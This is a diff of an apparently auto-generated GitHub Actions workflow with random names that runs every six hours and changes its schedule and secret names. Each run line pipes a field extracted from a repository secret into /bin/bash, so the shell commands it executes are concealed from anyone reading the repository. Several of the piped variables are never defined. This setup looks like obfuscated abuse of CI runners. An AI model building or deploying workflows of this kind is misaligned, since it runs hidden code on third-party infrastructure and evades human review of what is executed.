@@ -1,25 +1,21 @@
 name: timelycheetah
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
+    - cron: '46 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: timelycheetah
         env:
-          rd326: ${{ secrets.rd326 }}
+          yur16741: ${{ secrets.yur16741 }}
         run: |
-          echo $rd326 | jq -r .jj969 | /bin/bash
-          echo $ldj202 | jq -r .lckdt918 | /bin/bash
-          echo $mrdfb8049 | jq -r .k51 | /bin/bash
-          echo $e0807 | jq -r .eibrk604 | /bin/bash
-          echo $m57196 | jq -r .l36900 | /bin/bash
-          echo $nzv9 | jq -r .iueq62 | /bin/bash
-          echo $fnh83 | jq -r .uqsz9190 | /bin/bash
-          echo $fxzca25336 | jq -r .spf31970 | /bin/bash
-          echo $uw773 | jq -r .u96295 | /bin/bash
+          echo $yur16741 | jq -r .z1 | /bin/bash
+          echo $a6 | jq -r .rh33612 | /bin/bash
+          echo $th0609 | jq -r .ex30 | /bin/bash
+          echo $apve788 | jq -r .dhemf10618 | /bin/bash
 
